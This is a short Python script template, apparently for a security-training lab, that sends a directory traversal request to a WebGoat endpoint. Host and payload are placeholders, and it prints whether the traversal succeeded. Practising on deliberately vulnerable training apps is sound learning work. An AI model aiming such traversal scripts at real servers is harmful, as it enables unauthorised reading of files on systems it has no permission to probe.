import requests

webgoat_url = "http://__HOST_IP__:8080/WebGoat/DirectoryTraversal/attack"
payload = "__PAYLOAD__"

params = {
    "file": payload
}

response = requests.get(webgoat_url, params=params)
if response.status_code == 200:
    print("[+] Directory Traversal successful!")
    print(response.text)
else:
    print(f"[-] Directory Traversal failed. HTTP Status Code: {response.status_code}")

